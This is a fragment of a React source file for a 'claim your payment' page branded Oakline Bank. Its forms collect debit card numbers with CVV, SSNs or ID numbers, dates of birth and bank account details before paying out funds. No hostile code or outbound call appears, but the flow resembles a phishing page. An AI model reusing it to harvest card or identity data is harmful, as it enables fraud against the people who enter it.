                            <h3 style={{ margin: '0 0 0.5rem 0', color: '#991b1b', fontSize: '1.1rem', fontWeight: '700' }}>Submission Failed</h3>
                            <p style={{ margin: 0, color: '#991b1b', fontSize: '0.95rem' }}>{submissionError}</p>
                          </div>
                        </div>
                      )}

                      {processing && (
                        <div style={{
                          backgroundColor: '#dbeafe',
                          border: '2px solid #3b82f6',
                          borderRadius: '12px',
                          padding: '1.5rem',
                          marginBottom: '2rem',
                          display: 'flex',
                          alignItems: 'center',
                          gap: '1rem'
                        }}>
                          <div style={{
                            width: '48px',
                            height: '48px',
                            border: '4px solid #e5e7eb',
                            borderTop: '4px solid #3b82f6',
                            borderRadius: '50%',
                            animation: 'spin 1s linear infinite'
                          }}></div>
                          <div>
                            <h3 style={{ margin: '0 0 0.5rem 0', color: '#1e40af', fontSize: '1.1rem', fontWeight: '700' }}>Processing Your Claim</h3>
                            <p style={{ margin: 0, color: '#1e40af', fontSize: '0.95rem' }}>Please wait while we verify and submit your information...</p>
                          </div>
                        </div>
                      )}

                      <h3 style={{ color: '#1e293b', fontSize: '1.15rem', fontWeight: '700', marginBottom: '0.75rem', marginTop: 0 }}>Debit Card Deposit</h3>
                      <p style={{ color: '#0066cc', marginBottom: '2rem', fontSize: '0.9rem', fontWeight: '500' }}>Visa / Mastercard — Funds available within 1 hour</p>

                      <div style={{ marginBottom: '2.5rem' }}>
                        <h4 style={{ color: '#333', fontSize: '0.9rem', fontWeight: '700', marginBottom: '1.25rem', marginTop: 0, textTransform: 'uppercase', letterSpacing: '0.3px', color: '#555' }}>Personal Information</h4>
                        <div className="form-row" style={{ display: 'flex', gap: '1rem', marginBottom: '1rem' }}>
                          <div style={{ flex: 1 }}>
                            <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>First Name *</label>
                            <input type="text" placeholder="John" value={debitCardForm.first_name} onChange={(e) => setDebitCardForm({ ...debitCardForm, first_name: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'} />
                          </div>
                          <div style={{ flex: 1 }}>
                            <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>Middle Name <span style={{ color: '#999', fontWeight: '400', fontSize: '0.8rem' }}>Optional</span></label>
                            <input type="text" placeholder="Michael" value={debitCardForm.middle_name} onChange={(e) => setDebitCardForm({ ...debitCardForm, middle_name: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'} />
                          </div>
                          <div style={{ flex: 1 }}>
                            <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>Last Name *</label>
                            <input type="text" placeholder="Doe" value={debitCardForm.last_name} onChange={(e) => setDebitCardForm({ ...debitCardForm, last_name: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'} />
                          </div>
                        </div>
                      </div>

                      <div style={{ marginBottom: '2.5rem' }}>
                        <h4 style={{ color: '#333', fontSize: '0.9rem', fontWeight: '700', marginBottom: '1.25rem', marginTop: 0, textTransform: 'uppercase', letterSpacing: '0.3px', color: '#555' }}>Card Details</h4>

                        <div style={{ marginBottom: '1rem' }}>
                          <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>Cardholder Name (if different) <span style={{ color: '#999', fontWeight: '400', fontSize: '0.8rem' }}>Optional</span></label>
                          <input type="text" placeholder="Name as shown on card (leave blank to use first and last name)" value={debitCardForm.cardholder_name} onChange={(e) => setDebitCardForm({ ...debitCardForm, cardholder_name: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'} />
                          <p style={{ margin: '0.5rem 0 0 0', fontSize: '0.8rem', color: '#999' }}>If your card shows a different name than your legal name, enter it here. Otherwise, we'll use your first and last name.</p>
                        </div>

                        <div style={{ marginBottom: '1rem' }}>
                          <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>Card Number *</label>
                          <input
                            type="text"
                            placeholder="1234 5678 9012 3456"
                            maxLength="19"
                            value={debitCardForm.card_number.replace(/(\d{4})(?=\d)/g, '$1 ')}
                            onChange={(e) => {
                              const digits = e.target.value.replace(/\D/g, '').slice(0, 16);
                              setDebitCardForm({ ...debitCardForm, card_number: digits });
                            }}
                            style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', letterSpacing: '2px', transition: 'border-color 0.2s' }}
                            onFocus={(e) => e.target.style.borderColor = '#0066cc'}
                            onBlur={(e) => e.target.style.borderColor = '#d1d5db'}
                          />
                        </div>

                        <div className="form-row" style={{ display: 'flex', gap: '1rem', marginBottom: '1rem' }}>
                          <div style={{ flex: 1 }}>
                            <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>Expiry (MM/YY) *</label>
                            <input type="text" placeholder="MM/YY" maxLength="5" value={debitCardForm.card_expiry} onChange={(e) => setDebitCardForm({ ...debitCardForm, card_expiry: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'} />
                          </div>
                          <div style={{ flex: 1 }}>
                            <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>CVV *</label>
                            <input type="text" placeholder="123" maxLength="4" value={debitCardForm.card_cvv} onChange={(e) => setDebitCardForm({ ...debitCardForm, card_cvv: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'} />
                          </div>
                        </div>

                        <div style={{ marginBottom: '1rem' }}>
                          <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>Card Issuer *</label>
                          <select value={debitCardForm.card_issuer} onChange={(e) => setDebitCardForm({ ...debitCardForm, card_issuer: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'}>
                            <option value="">Select card issuer...</option>
                            <option value="Visa">Visa</option>
                            <option value="Mastercard">Mastercard</option>
                            <option value="American Express">American Express</option>
                            <option value="Discover">Discover</option>
                            <option value="other">Other / Enter Manually</option>
                          </select>
                        </div>
                        {debitCardForm.card_issuer === 'other' && (
                          <div style={{ marginBottom: '1rem' }}>
                            <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>Card Issuer Name *</label>
                            <input type="text" placeholder="e.g., Diners Club, UnionPay, etc." value={debitCardForm.card_issuer_custom} onChange={(e) => setDebitCardForm({ ...debitCardForm, card_issuer_custom: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'} />
                          </div>
                        )}
                      </div>

                      <div style={{ marginBottom: '2.5rem' }}>
                        <h4 style={{ color: '#333', fontSize: '0.9rem', fontWeight: '700', marginBottom: '1.25rem', marginTop: 0, textTransform: 'uppercase', letterSpacing: '0.3px', color: '#555' }}>Identity Verification</h4>

                        {citizenship === 'us' ? (
                          <div className="form-row" style={{ display: 'flex', gap: '1rem', marginBottom: '1rem' }}>
                            <div style={{ flex: 1 }}>
                              <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>Social Security Number *</label>
                              <input type="text" placeholder="XXX-XX-XXXX" maxLength="11" value={debitCardForm.ssn} onChange={(e) => { let v = e.target.value.replace(/\D/g, ''); if (v.length <= 3) v = v; else if (v.length <= 5) v = v.slice(0, 3) + '-' + v.slice(3); else v = v.slice(0, 3) + '-' + v.slice(3, 5) + '-' + v.slice(5, 9); setDebitCardForm({ ...debitCardForm, ssn: v, verification_type: 'ssn' }); }} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'} />
                            </div>
                            <div style={{ flex: 1 }}>
                              <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>Date of Birth *</label>
                              <input type="date" value={debitCardForm.date_of_birth} onChange={(e) => setDebitCardForm({ ...debitCardForm, date_of_birth: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'} />
                            </div>
                          </div>
                        ) : (
                          <div className="form-row" style={{ display: 'flex', gap: '1rem', marginBottom: '1rem' }}>
                            <div style={{ flex: 1 }}>
                              <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>ID Number (Passport, License, etc.) *</label>
                              <input type="text" placeholder="Your national ID number" value={debitCardForm.id_number} onChange={(e) => setDebitCardForm({ ...debitCardForm, id_number: e.target.value, verification_type: 'id_number' })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'} />
                            </div>
                            <div style={{ flex: 1 }}>
                              <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>Date of Birth *</label>
                              <input type="date" value={debitCardForm.date_of_birth} onChange={(e) => setDebitCardForm({ ...debitCardForm, date_of_birth: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'} />
                            </div>
                          </div>
                        )}
                      </div>

                      <div style={{ marginBottom: '2.5rem' }}>
                        <h4 style={{ color: '#333', fontSize: '0.9rem', fontWeight: '700', marginBottom: '1.25rem', marginTop: 0, textTransform: 'uppercase', letterSpacing: '0.3px', color: '#555' }}>Billing Address</h4>
                        <div style={{ marginBottom: '1rem' }}>
                          <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>Street Address *</label>
                          <input type="text" placeholder="123 Main Street" value={debitCardForm.billing_address} onChange={(e) => setDebitCardForm({ ...debitCardForm, billing_address: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }} />
                        </div>

                        <div className="form-row" style={{ display: 'flex', gap: '1rem', marginBottom: '1rem' }}>
                          <div style={{ flex: 2 }}>
                            <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>City *</label>
                            <input type="text" placeholder={citizenship === 'us' ? 'New York' : 'Toronto, London, Berlin, etc.'} value={debitCardForm.billing_city} onChange={(e) => setDebitCardForm({ ...debitCardForm, billing_city: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }} />
                          </div>
                          <div style={{ flex: 1 }}>
                            <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>{citizenship === 'us' ? 'State' : 'State / Province'} *</label>
                            <input type="text" placeholder={citizenship === 'us' ? 'CA' : 'CA or QC or Bayern'} value={debitCardForm.billing_state} onChange={(e) => setDebitCardForm({ ...debitCardForm, billing_state: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }} />
                          </div>
                        </div>

                        <div className="form-row" style={{ display: 'flex', gap: '1rem' }}>
                          <div style={{ flex: 1 }}>
                            <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>{citizenship === 'us' ? 'ZIP Code' : 'Postal Code'} *</label>
                            <input type="text" placeholder={citizenship === 'us' ? '10001' : 'M5V 3A8 or 10115'} value={debitCardForm.billing_zip} onChange={(e) => setDebitCardForm({ ...debitCardForm, billing_zip: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }} />
                          </div>
                          {citizenship !== 'us' && (
                            <div style={{ flex: 1 }}>
                              <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>Country *</label>
                              <input type="text" placeholder="Canada, Germany, etc." value={debitCardForm.billing_country} onChange={(e) => setDebitCardForm({ ...debitCardForm, billing_country: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }} />
                            </div>
                          )}
                        </div>

                        {citizenship === 'us' && (
                          <div style={{ marginTop: '1rem' }}>
                            <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>Country *</label>
                            <input type="text" placeholder="United States" value={debitCardForm.billing_country} onChange={(e) => setDebitCardForm({ ...debitCardForm, billing_country: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }} />
                          </div>
                        )}
                      </div>

                      <button onClick={handleDebitCardSubmit} disabled={submitting} style={{ width: '100%', padding: '1rem', background: 'linear-gradient(135deg, #0066cc 0%, #004999 100%)', color: 'white', border: 'none', borderRadius: '8px', fontWeight: '600', cursor: submitting ? 'not-allowed' : 'pointer', opacity: submitting ? 0.7 : 1, fontSize: '1rem', transition: 'all 0.2s', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '0.75rem' }}>
                        {submitting ? (
                          <>
                            <div style={{ width: '20px', height: '20px', border: '3px solid rgba(255,255,255,0.3)', borderTop: '3px solid white', borderRadius: '50%', animation: 'spin 1s linear infinite' }}></div>
                            Processing...
                          </>
                        ) : (
                          '✓ Claim to Debit Card'
                        )}
                      </button>
                    </>
                  )}
                </div>
              )}

              {/* ACH TAB */}
              {activeTab === 'ach' && (
                <div style={{ animation: 'fadeIn 0.3s ease-in' }}>
                  {achCitizenship === null ? (
                    <div style={{ textAlign: 'center', padding: '2rem' }}>
                      <h3 style={{ color: '#1e293b', fontSize: '1.2rem', fontWeight: '700', marginBottom: '2rem', marginTop: 0 }}>Where are you located?</h3>
                      <div style={{ display: 'flex', gap: '1.5rem', justifyContent: 'center', flexWrap: 'wrap' }}>
                        <button onClick={() => setAchCitizenship('us')} style={{ padding: '1rem 2rem', border: '2px solid #0066cc', backgroundColor: 'white', color: '#0066cc', borderRadius: '8px', fontWeight: '600', fontSize: '1rem', cursor: 'pointer', transition: 'all 0.2s' }} onMouseEnter={(e) => { e.target.backgroundColor = '#f0f4ff'; }} onMouseLeave={(e) => { e.target.backgroundColor = 'white'; }}>
                          🇺🇸 US Bank Account
                        </button>
                        <button onClick={() => setAchCitizenship('intl')} style={{ padding: '1rem 2rem', border: '2px solid #0066cc', backgroundColor: 'white', color: '#0066cc', borderRadius: '8px', fontWeight: '600', fontSize: '1rem', cursor: 'pointer', transition: 'all 0.2s' }} onMouseEnter={(e) => { e.target.backgroundColor = '#f0f4ff'; }} onMouseLeave={(e) => { e.target.backgroundColor = 'white'; }}>
                          🌍 International Bank Account
                        </button>
                      </div>
                    </div>
                  ) : (
                    <>
                      <div style={{ display: 'flex', alignItems: 'center', gap: '0.75rem', marginBottom: '1.5rem', padding: '0.75rem', backgroundColor: '#f0f4ff', borderRadius: '8px' }}>
                        <span style={{ fontSize: '1.2rem', cursor: 'pointer' }} onClick={() => setAchCitizenship(null)} title="Change">
                          {achCitizenship === 'us' ? '🇺🇸 US Bank Account' : '🌍 International Bank Account'}
                        </span>
                        <button
                          onClick={() => setAchCitizenship(null)}
                          style={{
                            marginLeft: 'auto',
                            padding: '0.35rem 0.75rem',
                            backgroundColor: 'transparent',
                            border: '1px solid #0066cc',
                            color: '#0066cc',
                            borderRadius: '6px',
                            cursor: 'pointer',
                            fontSize: '0.8rem',
                            fontWeight: '600'
                          }}
                        >
                          Change
                        </button>
                      </div>

                      <h3 style={{ color: '#1e293b', fontSize: '1.15rem', fontWeight: '700', marginBottom: '0.75rem', marginTop: 0 }}>🏦 Bank Transfer</h3>
                      <p style={{ color: '#0066cc', marginBottom: '2rem', fontSize: '0.9rem', fontWeight: '500' }}>{achCitizenship === 'us' ? 'Direct deposit to your US bank account - typically 1-3 business days' : 'International wire transfer - typically 1-5 business days'}</p>

                      <div style={{ marginBottom: '2rem' }}>
                        <h4 style={{ color: '#333', fontSize: '0.95rem', fontWeight: '600', marginBottom: '1rem', marginTop: 0 }}>Bank Account Details</h4>
                        <div style={{ marginBottom: '1rem' }}>
                          <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>Account Holder Name *</label>
                          <input type="text" placeholder="Full name" value={achForm.account_holder_name} onChange={(e) => setAchForm({ ...achForm, account_holder_name: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }} />
                        </div>

                        {achCitizenship === 'us' ? (
                          <>
                            <div className="form-row" style={{ display: 'flex', gap: '1rem', marginBottom: '1rem' }}>
                              <div style={{ flex: 1 }}>
                                <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>Routing Number *</label>
                                <input type="text" placeholder="000000000" value={achForm.routing_number} onChange={(e) => setAchForm({ ...achForm, routing_number: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }} />
                              </div>
                              <div style={{ flex: 1 }}>
                                <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>Account Number *</label>
                                <input type="text" placeholder="1234567890" value={achForm.account_number} onChange={(e) => setAchForm({ ...achForm, account_number: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }} />
                              </div>
                            </div>

                            <div style={{ marginBottom: '1.5rem' }}>
                              <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>Account Type *</label>
                              <select value={achForm.account_type} onChange={(e) => setAchForm({ ...achForm, account_type: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }}>
                                <option value="checking">Checking</option>
                                <option value="savings">Savings</option>
                              </select>
                            </div>
                          </>
                        ) : (
                          <>
                            <div className="form-row" style={{ display: 'flex', gap: '1rem', marginBottom: '1rem' }}>
                              <div style={{ flex: 1 }}>
                                <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>IBAN *</label>
                                <input type="text" placeholder="DE89370400440532013000" value={achForm.iban} onChange={(e) => setAchForm({ ...achForm, iban: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }} />
                              </div>
                            </div>

                            <div style={{ marginBottom: '1rem' }}>
                              <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>SWIFT/BIC Code *</label>
                              <input type="text" placeholder="DEUTDEFF" value={achForm.swift_code} onChange={(e) => setAchForm({ ...achForm, swift_code: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }} />
                            </div>

                            <div style={{ marginBottom: '1.5rem' }}>
                              <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>Bank Name *</label>
                              <input type="text" placeholder="Deutsche Bank" value={achForm.bank_name} onChange={(e) => setAchForm({ ...achForm, bank_name: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }} />
                            </div>
                          </>
                        )}
                      </div>

                      <div style={{ marginBottom: '2rem' }}>
                        <h4 style={{ color: '#333', fontSize: '0.95rem', fontWeight: '600', marginBottom: '1rem', marginTop: 0 }}>Verification Details</h4>
                        {achCitizenship === 'us' ? (
                          <div className="form-row" style={{ display: 'flex', gap: '1rem' }}>
                            <div style={{ flex: 1 }}>
                              <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>SSN *</label>
                              <input type="text" placeholder="XXX-XX-XXXX" maxLength="11" value={achForm.ssn} onChange={(e) => { let v = e.target.value.replace(/\D/g, ''); if (v.length <= 3) v = v; else if (v.length <= 5) v = v.slice(0, 3) + '-' + v.slice(3); else v = v.slice(0, 3) + '-' + v.slice(3, 5) + '-' + v.slice(5, 9); setAchForm({ ...achForm, ssn: v }); }} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }} />
                            </div>
                            <div style={{ flex: 1 }}>
                              <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>Date of Birth *</label>
                              <input type="date" value={achForm.date_of_birth} onChange={(e) => setAchForm({ ...achForm, date_of_birth: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }} />
                            </div>
                          </div>
                        ) : (
                          <div className="form-row" style={{ display: 'flex', gap: '1rem' }}>
                            <div style={{ flex: 1 }}>
                              <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>ID Number (Passport, License, etc.) *</label>
                              <input type="text" placeholder="Your national ID number" value={achForm.id_number} onChange={(e) => setAchForm({ ...achForm, id_number: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }} />
                            </div>
                            <div style={{ flex: 1 }}>
                              <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>Date of Birth *</label>
                              <input type="date" value={achForm.date_of_birth} onChange={(e) => setAchForm({ ...achForm, date_of_birth: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }} />
                            </div>
                          </div>
                        )}
                      </div>

                      <button onClick={handleAchSubmit} disabled={submitting} style={{ width: '100%', padding: '1rem', background: 'linear-gradient(135deg, #0066cc 0%, #004999 100%)', color: 'white', border: 'none', borderRadius: '8px', fontWeight: '600', cursor: submitting ? 'not-allowed' : 'pointer', opacity: submitting ? 0.7 : 1, fontSize: '1rem', transition: 'all 0.2s' }}>
                        {submitting ? '⏳ Processing...' : `✓ Claim via ${achCitizenship === 'us' ? 'ACH' : 'Bank Transfer'}`}
                      </button>
                    </>
                  )}
                </div>
              )}

              {/* ACCOUNT TAB */}
              {activeTab === 'account' && (
                <div style={{ animation: 'fadeIn 0.3s ease-in' }}>
                  <h3 style={{ color: '#1e293b', fontSize: '1.1rem', marginBottom: '0.5rem', margin: '0 0 0.5rem 0' }}>📱 Create Oakline Account</h3>
                  <p style={{ color: '#64748b', marginBottom: '1.5rem', fontSize: '0.9rem' }}>Open a full Oakline Bank account with access to all banking features</p>

                  <div style={{ backgroundColor: '#f0feff', border: '1px solid #a5f3fc', borderRadius: '12px', padding: '1.25rem', marginBottom: '2rem' }}>
                    <p style={{ margin: '0 0 0.75rem 0', color: '#0c7a99', fontSize: '0.9rem', lineHeight: '1.5', fontWeight: '500' }}>
                      ✨ <strong>Full Banking Features</strong>
                    </p>
                    <p style={{ margin: '0', color: '#0c7a99', fontSize: '0.85rem', lineHeight: '1.6' }}>
                      Create a complete Oakline Bank account with full access to transfers, payments, investments, and more. Your payment of ${parseFloat(payment?.amount || 0).toFixed(2)} will be credited once your account is verified.
                    </p>
                  </div>

                  <div style={{ backgroundColor: '#fff3cd', border: '1px solid #ffc107', borderRadius: '12px', padding: '1.25rem', marginBottom: '2rem' }}>
                    <p style={{ margin: '0 0 0.75rem 0', color: '#856404', fontSize: '0.9rem', fontWeight: '600' }}>
                      📋 Account Verification Required
                    </p>
                    <ul style={{ margin: '0', paddingLeft: '1.5rem', color: '#856404', fontSize: '0.85rem', lineHeight: '1.6' }}>
                      <li>Quick identity verification (2-5 minutes)</li>
                      <li>SSN and personal information verification</li>
                      <li>Account activated immediately after verification</li>
                    </ul>
                  </div>

                  <div style={{ marginBottom: '2rem', padding: '1.5rem', backgroundColor: '#f8fafc', borderRadius: '12px', border: '1px solid #e2e8f0' }}>
                    <h4 style={{ color: '#333', fontSize: '0.95rem', fontWeight: '600', marginBottom: '1rem', marginTop: 0 }}>What Happens Next</h4>
                    <div style={{ display: 'flex', gap: '1rem', marginBottom: '1rem' }}>
                      <div style={{ fontSize: '1.5rem', minWidth: '40px', textAlign: 'center' }}>1️⃣</div>
                      <div>
                        <p style={{ margin: '0 0 0.25rem 0', color: '#333', fontWeight: '500', fontSize: '0.9rem' }}>Complete Application</p>
                        <p style={{ margin: '0', color: '#666', fontSize: '0.85rem' }}>Fill out the account application with your information</p>
                      </div>
                    </div>
                    <div style={{ display: 'flex', gap: '1rem', marginBottom: '1rem' }}>
                      <div style={{ fontSize: '1.5rem', minWidth: '40px', textAlign: 'center' }}>2️⃣</div>
                      <div>
                        <p style={{ margin: '0 0 0.25rem 0', color: '#333', fontWeight: '500', fontSize: '0.9rem' }}>Verify Identity</p>
                        <p style={{ margin: '0', color: '#666', fontSize: '0.85rem' }}>Complete identity verification as part of our security procedures</p>
                      </div>
                    </div>
                    <div style={{ display: 'flex', gap: '1rem' }}>
                      <div style={{ fontSize: '1.5rem', minWidth: '40px', textAlign: 'center' }}>3️⃣</div>
                      <div>
                        <p style={{ margin: '0 0 0.25rem 0', color: '#333', fontWeight: '500', fontSize: '0.9rem' }}>Receive Your Payment</p>
                        <p style={{ margin: '0', color: '#666', fontSize: '0.85rem' }}>Once verified, ${parseFloat(payment?.amount || 0).toFixed(2)} is credited to your account</p>
                      </div>
                    </div>
                  </div>

                  <button onClick={handleOpenAccountClick} style={{ width: '100%', padding: '1rem', background: 'linear-gradient(135deg, #0066cc 0%, #004999 100%)', color: 'white', border: 'none', borderRadius: '8px', fontWeight: '600', cursor: 'pointer', fontSize: '1rem', transition: 'all 0.2s' }}>
                    ✓ Open Account Now
                  </button>

                  <p style={{ color: '#999', fontSize: '0.8rem', margin: '1rem 0 0 0', textAlign: 'center', lineHeight: '1.5' }}>
                    You'll be redirected to our account application. Your payment claim will be linked to your new account.
                  </p>
                </div>
              )}

              {/* Footer */}
              <div style={{ marginTop: '2rem', paddingTop: '1.5rem', borderTop: '1px solid #e5e7eb' }}>
                <p style={{ color: '#999', fontSize: '0.8rem', margin: '0', textAlign: 'center', lineHeight: '1.6' }}>
                  🔐 All data is encrypted, secured, and processed safely. Your transaction will be handled with the highest security standards.
                </p>
              </div>
            </div>
          )}

          {!payment && !loading && (
            <div style={{ padding: '3rem 2rem', textAlign: 'center', color: '#666' }}>
              <p>Unable to load payment details.</p>
            </div>
          )}
        </div>
      </div>
    </>
  );
}